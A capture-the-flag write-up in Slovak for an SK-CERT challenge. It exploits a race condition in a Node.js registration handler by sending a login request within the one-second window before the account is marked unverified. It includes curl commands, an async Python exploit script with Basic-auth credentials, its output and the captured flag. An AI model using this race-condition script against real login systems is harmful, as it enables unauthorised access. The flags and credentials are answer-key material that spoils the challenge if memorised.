# Zadanie

EN: The secret website is protected by a login page. Can you find a way to get in?

SK: Tajn√° webov√° str√°nka je chr√°nen√° prihlasovacou str√°nkou. Dok√°≈æe≈° n√°js≈• sp√¥sob, ako sa dosta≈• dovn√∫tra?

## Rie≈°enie

Z predo≈°lej √∫lohy m√°me teda meno aj heslo...Autentikujem sa a vid√≠me ak√∫si str√°nku.. Z index.js vid√≠me r√¥zne api koncov√© body, zadanie hovor√≠ dosta≈• sa dovn√∫tra, ch√°pem teda, ≈æe nestaƒç√≠ len autentik√°cia, lebo str√°nka obsahuje register a login formul√°r...

Vytvor√≠me teda pou≈æ√≠vateƒæa, dostaneme alert 

> Welcome to the Dark Stable. The Council will judge your worthiness.

Pri pokuse o login v≈°ak dostaneme

> The Dark Council has not approved you yet

```javascript
async function sendEmailToAdministrator(userId, username) {
  // TODO: Implement email sending. We'll just sleep until then.
  await sleep(1000);
  console.log(`ü¶Ñ Dark Council notified about new subject: ${username}`);
  return true;
}

app.post("/api/register", async (req, res) => {
  try {
    const { username, password, email } = req.body;

    const { rows } = await dbAsync.query(
      "INSERT INTO users (username, password, email) VALUES ($1, $2, $3) RETURNING id",
      [username, password, email]
    );

    const userId = rows[0].id;
    await sendEmailToAdministrator(userId, username);

    await dbAsync.query("UPDATE users SET verified = false WHERE id = $1", [
      userId,
    ]);

    return res.json({
      success: true,
      message:
        "Welcome to the Dark Stable. The Council will judge your worthiness.",
    });
  } catch (err) {
    if (err.constraint === "users_username_key") {
      return res.status(400).json({ error: "Username already exists" });
    }
    res.status(500).json({ error: "Registration failed", msg: err.message });
  }
});
```

Pozorn√©mu oku v≈°ak neujde, ≈æe server pri registr√°cii najprv vykon√° ƒçinnos≈•, pri ktorej syst√©m 1s niƒç nerob√≠ a a≈æ potom nastav√≠ pou≈æ√≠vateƒæovi status verified na hodnotu false. Tak≈æe pokiaƒæ stihneme posla≈• request na login do jednej sekundy od registr√°cie, malo by n√°s pusti≈• dovn√∫tra. Tu si to v≈°ak bude vy≈æadova≈• ide√°lne nejak√Ω skript alebo ruƒçne spusten√© dva curl requesty v dvoch terminal okn√°ch a r√Ωchle ruky.

```bash
curl -X POST http://exp.cybergame.sk:7000/secretbackend/api/register -H "Authorization: Basic cHIxbmNlc3M6U0stQ0VSVHswZmZfYnlfNF9zMW5nbGVfc2w0c2hfZjgzNmE4YjF9" -H "Content-Type: application/json" -d '{"username": "pony", "password":"pony", "email":"pony@pony.pony"}'
a hneƒè r√Ωchlo
curl -X POST http://exp.cybergame.sk:7000/secretbackend/api/login -H "Authorization: Basic cHIxbmNlc3M6U0stQ0VSVHswZmZfYnlfNF9zMW5nbGVfc2w0c2hfZjgzNmE4YjF9" -H "Content-Type: application/json" -d '{"username": "pony", "password":"pony"}'
ide√°lne dve terminal okn√°
```

pr√≠padne python skript, ale ide√°lne asynchr√≥nne, preto≈æe pri pokusoch odi≈°la login po≈æiadavka v≈ædy a≈æ po viac ako sekunde (pomal√Ω python asi :D )

```python
import httpx
import asyncio
from datetime import datetime

def log(msg):
    print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]}] {msg}")

headers = {
    "Authorization": "Basic cHIxbmNlc3M6U0stQ0VSVHswZmZfYnlfNF9zMW5nbGVfc2w0c2hfZjgzNmE4YjF9",
    "Content-Type": "application/json"
}

data_register = {
    "username": "pony",
    "password": "pony",
    "email": "pony@pony.pony"
}

data_login = {
    "username": "pony",
    "password": "pony"
}

async def send_register(client):
    log("‚û°Ô∏è  [REGISTER] Posielam POST /register")
    resp = await client.post("http://exp.cybergame.sk:7000/secretbackend/api/register",
                             json=data_register, headers=headers)
    log(f"‚úÖ [REGISTER] {resp.status_code}")
    print(resp.text)
    log("‚úÖ [REGISTER] Hotovo\n")

async def send_login(client, delay=0.3):
    await asyncio.sleep(delay)
    log(f"‚û°Ô∏è  [LOGIN] Posielam POST /login po {int(delay * 1000)} ms")
    resp = await client.post("http://exp.cybergame.sk:7000/secretbackend/api/login",
                             json=data_login, headers=headers)
    log(f"‚úÖ [LOGIN] {resp.status_code}")
    print(resp.text)
    log("‚úÖ [LOGIN] Hotovo")

async def main():
    async with httpx.AsyncClient() as client:
        # Spust√≠me register a login s√∫ƒçasne, login sa oneskor√≠ o 300ms
        await asyncio.gather(
            send_register(client),
            send_login(client, delay=0.3)
        )

asyncio.run(main())
```

V√Ωstup:

```
[2025-04-10 21:32:33.478] ‚û°Ô∏è  [REGISTER] Posielam POST /register
[2025-04-10 21:32:33.794] ‚û°Ô∏è  [LOGIN] Posielam POST /login po 300 ms
[2025-04-10 21:32:33.830] ‚úÖ [LOGIN] 200
{"success":true,"welcome_msg":"Access granted. The light has no power here. You walk the path of the unseen, where only those who understand the night may tread. Tread carefully, for even the darkness has its watchers‚Ä¶ SK-CERT{r4c3_4g41n5t_th3_l1ght_4nd_w1n_w1th_th3_p0w3r_0f_th3_n1ght}"}
[2025-04-10 21:32:33.832] ‚úÖ [LOGIN] Hotovo
[2025-04-10 21:32:34.540] ‚úÖ [REGISTER] 200
{"success":true,"message":"Welcome to the Dark Stable. The Council will judge your worthiness."}
[2025-04-10 21:32:34.542] ‚úÖ [REGISTER] Hotovo
```

## Vlajka

```
SK-CERT{r4c3_4g41n5t_th3_l1ght_4nd_w1n_w1th_th3_p0w3r_0f_th3_n1ght}
```
